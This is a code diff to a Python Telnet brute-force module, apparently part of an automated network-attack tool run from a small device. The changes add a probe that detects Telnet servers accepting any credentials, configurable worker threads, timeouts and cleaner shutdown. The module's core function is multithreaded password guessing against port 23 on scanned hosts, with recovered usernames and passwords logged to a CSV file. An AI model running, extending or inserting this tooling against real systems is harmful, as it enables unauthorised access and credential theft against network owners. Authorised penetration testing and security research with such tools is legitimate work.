@@ -9,12 +9,16 @@ import telnetlib
 import threading
 import logging
 import time
-from queue import Queue
+from queue import Queue, Empty
 from shared import SharedData
 from logger import Logger
+from timeout_utils import (
+    join_threads_with_timeout,
+    drain_queue_safely
+)
 
 # Configure the logger
-logger = Logger(name="telnet_connector.py", level=logging.DEBUG)
+logger = Logger(name="telnet_connector.py", level=logging.INFO)
 
 # Define the necessary global variables
 b_class = "TelnetBruteforce"
@@ -32,19 +36,32 @@ class TelnetBruteforce:
         self.telnet_connector = TelnetConnector(shared_data)
         logger.info("TelnetConnector initialized.")
 
-    def bruteforce_telnet(self, ip, port):
+    def bruteforce_telnet(self, ip, port, mac_address='', hostname=''):
         """
         Perform brute-force attack on a Telnet server.
         """
-        return self.telnet_connector.run_bruteforce(ip, port)
+        return self.telnet_connector.run_bruteforce(ip, port, mac_address, hostname)
 
     def execute(self, ip, port, row, status_key):
         """
         Execute the brute-force attack.
         """
+        start_time = time.time()
+        logger.lifecycle_start("TelnetBruteforce", ip, port)
         self.shared_data.bjornorch_status = "TelnetBruteforce"
-        success, results = self.bruteforce_telnet(ip, port)
-        return 'success' if success else 'failed'
+        # Extract hostname and MAC from the row passed by orchestrator
+        hostname = row.get('Hostnames', '')
+        mac_address = row.get('MAC Address', '')
+        try:
+            success, results = self.bruteforce_telnet(ip, port, mac_address, hostname)
+            status = 'success' if success else 'no_creds_found'
+        except Exception as e:
+            logger.error(f"Telnet bruteforce error for {ip}: {e}")
+            status = 'error'
+        finally:
+            duration = time.time() - start_time
+            logger.lifecycle_end("TelnetBruteforce", status, duration, ip)
+        return status
 
 class TelnetConnector:
     """
@@ -61,7 +78,7 @@ class TelnetConnector:
         self.telnetfile = shared_data.telnetfile
         # If the file does not exist, it will be created
         if not os.path.exists(self.telnetfile):
-            logger.info(f"File {self.telnetfile} does not exist. Creating...")
+            logger.debug(f"Creating {self.telnetfile}")
             with open(self.telnetfile, "w") as f:
                 f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
         self.results = []  # List to store results temporarily
@@ -69,6 +86,9 @@ class TelnetConnector:
         self.progress_lock = threading.Lock()
         self.progress_count = 0
         self.progress_total = 0
+        # Shared cache for IPs that allow no-auth access
+        self.no_auth_ips = {}
+        self.no_auth_lock = threading.Lock()
 
     def _load_csv_filtered(self, filepath, port_filter):
         """Load CSV and filter rows containing the specified port."""
@@ -88,12 +108,37 @@ class TelnetConnector:
         """
         self.scan = self._load_csv_filtered(self.shared_data.netkbfile, "23")
 
+    def _check_no_auth_required(self, adresse_ip):
+        """
+        Check if telnet allows login without real authentication.
+        Returns True if no auth required (should skip credential logging).
+        """
+        import uuid
+        garbage_user = f"test_{uuid.uuid4().hex[:8]}"
+        garbage_pass = uuid.uuid4().hex
+        try:
+            tn = telnetlib.Telnet(adresse_ip, timeout=10)
+            tn.read_until(b"login: ", timeout=5)
+            tn.write(garbage_user.encode('ascii') + b"\n")
+            tn.read_until(b"Password: ", timeout=5)
+            tn.write(garbage_pass.encode('ascii') + b"\n")
+            time.sleep(1)
+            response = tn.expect([b"Login incorrect", b"Password: ", b"$ ", b"# "], timeout=5)
+            tn.close()
+            # If garbage creds get a shell, no real auth required
+            if response[0] == 2 or response[0] == 3:
+                return True
+        except:
+            pass
+        return False
+
     def telnet_connect(self, adresse_ip, user, password):
         """
         Establish a Telnet connection and try to log in with the provided credentials.
+        Uses 30 second timeout for connection.
         """
         try:
-            tn = telnetlib.Telnet(adresse_ip)
+            tn = telnetlib.Telnet(adresse_ip, timeout=30)
             tn.read_until(b"login: ", timeout=5)
             tn.write(user.encode('ascii') + b"\n")
             if password:
@@ -115,37 +160,63 @@ class TelnetConnector:
     def worker(self, success_flag):
         """
         Worker thread to process items in the queue.
+        Uses graceful shutdown pattern with timeout on queue.get().
         """
-        while not self.queue.empty():
+        while True:
             if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping worker thread.")
                 break
+            try:
+                item = self.queue.get(timeout=1.0)
+            except Empty:
+                if self.queue.empty():
+                    break
+                continue
 
-            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
-            if self.telnet_connect(adresse_ip, user, password):
-                with self.lock:
-                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
-                    logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
+            adresse_ip, user, password, mac_address, hostname, port = item
+            try:
+                if self.telnet_connect(adresse_ip, user, password):
+                    with self.lock:
+                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
+                        logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
+                        success_flag[0] = True
+                    # File I/O outside lock
                     self.save_results()
                     self.removeduplicates()
-                    success_flag[0] = True
-            self.queue.task_done()
-            with self.progress_lock:
-                self.progress_count += 1
-                if self.progress_count % 50 == 0:
-                    logger.info(f"Bruteforcing Telnet... {self.progress_count}/{self.progress_total}")
+            finally:
+                self.queue.task_done()
+                with self.progress_lock:
+                    self.progress_count += 1
+                    if self.progress_count % 50 == 0:
+                        logger.info(f"Bruteforcing Telnet... {self.progress_count}/{self.progress_total}")
 
-    def run_bruteforce(self, adresse_ip, port):
-        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
+    def run_bruteforce(self, adresse_ip, port, mac_address='', hostname=''):
+        # Reset no-auth cache for this run
+        with self.no_auth_lock:
+            self.no_auth_ips = {}
 
-        # Find the row for this IP
-        mac_address = ""
-        hostname = ""
-        for row in self.scan:
-            if row.get('IPs') == adresse_ip:
-                mac_address = row.get('MAC Address', '')
-                hostname = row.get('Hostnames', '')
-                break
+        # Use provided mac_address and hostname from orchestrator (more reliable)
+        # Fallback to lookup if not provided
+        if not mac_address or not hostname:
+            self.load_scan_file()
+            for row in self.scan:
+                if row.get('IPs') == adresse_ip:
+                    if not mac_address:
+                        mac_address = row.get('MAC Address', '')
+                    if not hostname:
+                        hostname = row.get('Hostnames', '')
+                    break
+
+        # Check if Telnet doesn't require authentication BEFORE starting bruteforce
+        logger.info(f"Checking if Telnet on {adresse_ip} requires authentication...")
+        if self._check_no_auth_required(adresse_ip):
+            logger.warning(f"Telnet on {adresse_ip} does not require authentication - accepts any credentials!")
+            with self.lock:
+                self.results.append([mac_address, adresse_ip, hostname, "[ANY]", "[NO AUTH REQUIRED]", port])
+            self.save_results()
+            self.removeduplicates()
+            with self.no_auth_lock:
+                self.no_auth_ips[adresse_ip] = True
+            return True, self.results  # Return success - we logged the no-auth finding
 
         total_tasks = len(self.users) * len(self.passwords)
         self.progress_total = total_tasks
@@ -163,23 +234,32 @@ class TelnetConnector:
 
         logger.info(f"Bruteforcing Telnet on {adresse_ip}... (0/{total_tasks})")
 
-        for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
+        for _ in range(self.shared_data.worker_threads):  # Configurable via shared_config.json
             t = threading.Thread(target=self.worker, args=(success_flag,))
             t.start()
             threads.append(t)
 
+        # Wait for queue with exit signal checking
+        queue_timeout = 300  # 5 minute max for queue processing
+        queue_start = time.time()
         while not self.queue.empty():
             if self.shared_data.orchestrator_should_exit:
                 logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                while not self.queue.empty():
-                    self.queue.get()
-                    self.queue.task_done()
+                drain_queue_safely(self.queue)
                 break
+            if time.time() - queue_start > queue_timeout:
+                logger.lifecycle_timeout("TelnetBruteforce", "queue processing", queue_timeout, adresse_ip)
+                drain_queue_safely(self.queue)
+                break
+            time.sleep(0.5)
 
-        self.queue.join()
+        # Give workers time to finish current items
+        time.sleep(2)
 
-        for t in threads:
-            t.join()
+        # Join threads with timeout
+        hanging = join_threads_with_timeout(threads, timeout=10, logger=logger)
+        if hanging:
+            logger.warning(f"Telnet bruteforce: {len(hanging)} threads did not terminate cleanly")
 
         return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
 
@@ -187,6 +267,10 @@ class TelnetConnector:
         """
         Save the results of successful login attempts to a CSV file.
         """
+        # Ensure file exists with header
+        if not os.path.exists(self.telnetfile):
+            with open(self.telnetfile, 'w', newline='') as f:
+                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
         with open(self.telnetfile, 'a', newline='') as f:
             writer = csv.writer(f)
             for row in self.results:
